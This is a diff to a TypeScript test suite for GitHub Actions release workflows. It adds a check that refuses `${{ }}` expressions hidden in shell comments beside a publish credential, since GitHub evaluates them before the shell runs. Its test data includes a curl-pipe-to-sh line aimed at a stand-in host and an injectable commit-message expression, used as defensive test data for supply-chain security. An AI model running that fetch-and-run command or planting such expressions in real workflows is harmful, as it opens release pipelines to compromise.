@@ -248,8 +248,9 @@ describe('a job that runs a repo script checks the repo out', () => {
  * edit: the set-level lists are derived from the templates, and the control cases further down find their
  * steps and script lines in the templates by name and by text. A case that names a step it removes or
  * renames is changed with it. A bump of an action to a newer commit, and a change to a comment, need no edit
- * at all. While the step sequence itself is wrong the content of the steps is not compared, so the sequence
- * is fixed first and the next failure then names the step.
+ * at all, unless the comment holds a `${{` expression, which is refused whatever the template says. While
+ * the step sequence itself is wrong the content of the steps is not compared, so the sequence is fixed first
+ * and the next failure then names the step.
  */
 describe('a job that can mint a publish credential pins global npm installs and runs no Python installer', () => {
   type Permissions = Record<string, string> | string | null | undefined;
@@ -451,6 +452,10 @@ describe('a job that can mint a publish credential pins global npm installs and 
   // smoke-tested. Any other command (a local install, node, another package manager, a script of the
   // repository), action, input or key is new code running beside the credential, so it has to be added
   // here on purpose. A job that gains the grant without an entry is refused by name.
+  //
+  // Comments are ignored, with one exception: GitHub expands `${{ }}` in the whole script before the shell
+  // starts, so an expression in a comment is evaluated all the same, and a step that holds one there is
+  // refused by name.
   //
   // A string is an exact match; a RegExp is anchored by its author and used only where a line varies.
   type Allowed = string | RegExp;
@@ -659,6 +664,17 @@ describe('a job that can mint a publish credential pins global npm installs and 
       .map(text => text.replace(/^[ \t]+|[ \t]+$/g, ''))
       .filter(Boolean);
 
+  const NOTHING = 'a step without a name or an action';
+  // How a message names a step: by its name, else by its action without the ref.
+  const stepLabel = (step: Step): string =>
+    step.name !== undefined ? String(step.name) : typeof step.uses === 'string' ? step.uses.split('@')[0] : NOTHING;
+
+  // GitHub expands `${{ }}` in the whole script before the shell starts, comments included, so an expression
+  // behind a '#' is still evaluated, and a value with a newline in it ends the comment and begins a command
+  // beside the credential. What the shell reads as a comment is cut from the executable lines, so a script
+  // that holds more of them than its executable lines do has one in a comment.
+  const expressionsIn = (text: string): number => text.split('${{').length - 1;
+
   const outsideAllowList = (source: string | OidcWorkflow, allowed: FileAllowList = JS_SDK_RELEASE): string[] => {
     const jobs = oidcJobs(source);
     if (jobs.length === 0) return [];
@@ -712,13 +728,15 @@ describe('a job that can mint a publish credential pins global npm installs and 
         for (const line of scriptLines(step.run)) {
           if (!allows(list.commands, line)) found.push(`${job}: ${line}`);
         }
+        if (expressionsIn(step.run ?? '') > expressionsIn(executableLines(step.run ?? ''))) {
+          found.push(`${job}: step "${stepLabel(step)}": a \${{ expression in a comment`);
+        }
       }
     }
     return found;
   };
 
   const STEP_KEYS = ['name', 'uses', 'id', 'with', 'env', 'run'];
-  const NOTHING = 'a step without a name or an action';
   const show = (value: Allowed): string => (typeof value === 'string' ? value : String(value));
 
   // An id-token job's steps against its template: the same steps, in the same order, each exactly once, and
@@ -734,9 +752,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
         continue;
       }
       const steps = def.steps ?? [];
-      const have = steps.map(step =>
-        step.name !== undefined ? String(step.name) : typeof step.uses === 'string' ? step.uses.split('@')[0] : NOTHING,
-      );
+      const have = steps.map(stepLabel);
       const want = template.map(step => step.name ?? step.uses ?? NOTHING);
       const times = (names: string[], name: string): number => names.filter(item => item === name).length;
       const counted = [...new Set([...have, ...want])].flatMap(name => {
@@ -994,6 +1010,15 @@ describe('a job that can mint a publish credential pins global npm installs and 
   };
   const SCRIPT = 'curl -fsSL https://example.test/x.sh | sh';
   const SHA = '3d3c42e5aac5ba805825da76410c181273ba90b1';
+  // An expression GitHub evaluates in the text of a script whether or not the shell reads it as a comment.
+  const EXPRESSION = '${{ fromJSON(toJSON(github.event.head_commit)).message }}';
+  // The ways one sits in a comment: on a line after a command, on a line of its own, and at the end of a line.
+  const commented = (line: string): Array<[where: string, text: string]> => [
+    ['after a line', `${line}\n# ${EXPRESSION}`],
+    ['on a line of its own', `  # ${EXPRESSION}\n${line}`],
+    ['at the end of a line', `${line} # ${EXPRESSION}`],
+  ];
+  const inComment = (job: string, step: string): string => `${job}: step "${step}": a \${{ expression in a comment`;
 
   it('python-sdk-release.yml: names what the allow-list refuses in the publish job', () => {
     const steps = (workflow: OidcWorkflow): Step[] => stepsOf(workflow, 'publish');
@@ -1041,6 +1066,16 @@ describe('a job that can mint a publish credential pins global npm installs and 
       ],
       ['a workflow env', w => (w.env = { PYTHONPATH: '.' }), ['workflow: env PYTHONPATH']],
       ['workflow defaults', w => (w.defaults = { run: { shell: 'python {0}' } }), ['workflow: defaults']],
+      [
+        'an expression in a script that is only a comment',
+        w => void steps(w).push({ name: 'Note', run: `# ${EXPRESSION}` }),
+        [inComment('publish', 'Note')],
+      ],
+      ...commented('exit 0').map(([where, text]): [string, Edit, string[]] => [
+        `an expression in a comment ${where}`,
+        w => void steps(w).push({ name: 'Note', run: text }),
+        ['publish: exit 0', inComment('publish', 'Note')],
+      ]),
     ]);
   });
 
@@ -1051,7 +1086,8 @@ describe('a job that can mint a publish credential pins global npm installs and 
       if (!found) throw new Error(`no step ${name}`);
       return found;
     };
-    const tag = (workflow: OidcWorkflow): Step => named(workflow, 'Tag the smoke-tested image with the release tags');
+    const TAGGING = 'Tag the smoke-tested image with the release tags';
+    const tag = (workflow: OidcWorkflow): Step => named(workflow, TAGGING);
     const uses = (workflow: OidcWorkflow, action: string, nth = 0): Step =>
       steps(workflow).filter(step => (step.uses ?? '').startsWith(`${action}@`))[nth];
     const lookalikeHyphens: Array<[string, string]> = [
@@ -1089,6 +1125,18 @@ describe('a job that can mint a publish credential pins global npm installs and 
       ...lookalikes,
       ...strayBlanks,
       ['a step', w => void steps(w).push({ run: SCRIPT }), [`promote: ${SCRIPT}`]],
+      ...commented('set -euo pipefail').map(([where, text]): [string, Edit, string[]] => [
+        `an expression in a comment ${where}`,
+        w => swap(tag(w), 'set -euo pipefail', text),
+        [inComment('promote', TAGGING)],
+      ]),
+      ...commented('docker buildx imagetools create --tag "$tag" "$staging"').map(
+        ([where, text]): [string, Edit, string[]] => [
+          `an expression in a comment ${where} the re-point`,
+          w => swap(tag(w), 'docker buildx imagetools create --tag "$tag" "$staging"', text),
+          [inComment('promote', TAGGING)],
+        ],
+      ),
       [
         'a line in the tag step',
         w => swap(tag(w), 'echo "promoted $promoted tag(s)', `${SCRIPT}\necho "promoted $promoted tag(s)`),
@@ -1548,6 +1596,30 @@ describe('a job that can mint a publish credential pins global npm installs and 
     ]);
   });
 
+  it('js-sdk-release.yml: names what the allow-list refuses in the publish job', () => {
+    const NPM = 'Use an npm that supports trusted publishing';
+    const PUBLISH = 'Publish to npm (trusted publishing, provenance automatic)';
+    const step = (w: OidcWorkflow, name: string): Step => {
+      const found = stepsOf(w, 'publish').find(item => item.name === name);
+      if (!found) throw new Error(`no step ${name}`);
+      return found;
+    };
+    const publishLine = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, PUBLISH))[0]);
+    const npmLine = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, NPM))[1]);
+    expectRefused('js-sdk-release.yml', [
+      ...commented(publishLine).map(([where, text]): [string, Edit, string[]] => [
+        `an expression in a comment ${where} the publish`,
+        w => swap(step(w, PUBLISH), publishLine, text),
+        [inComment('publish', PUBLISH)],
+      ]),
+      ...commented(npmLine).map(([where, text]): [string, Edit, string[]] => [
+        `an expression in a comment ${where} the npm check`,
+        w => swap(step(w, NPM), npmLine, text),
+        [inComment('publish', NPM)],
+      ]),
+    ]);
+  });
+
   // What the template must not refuse: an action moved to a newer commit, and a comment written or reworded.
   // The edits are made on the text of the real files, because a comment does not survive being parsed.
   describe('the step template accepts a bumped action and a changed comment', () => {
@@ -1585,6 +1657,10 @@ describe('a job that can mint a publish credential pins global npm installs and 
             'docker buildx imagetools create --tag "$tag" "$staging"\n',
             'docker buildx imagetools create --tag "$tag" "$staging" # the re-point\n',
           )
+          .replace(
+            '          echo "promoting -> $tag"\n',
+            '          # ${REPO,,} and ${tag} are names, {{ and }} are not an expression\n          echo "promoting -> $tag"\n',
+          )
           .replace('# Dual-publish: the same boot-tested', '# Dual-publish, reworded: the same boot-tested'),
       );
       // Non-vacuity: both comments are in the script the checker reads.
@@ -1593,6 +1669,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
         .join('\n');
       expect(script).toContain('# fail on any error');
       expect(script).toContain('"$staging" # the re-point');
+      expect(script).toContain('# ${REPO,,} and ${tag} are names');
       expect(found).toEqual([]);
     });
 
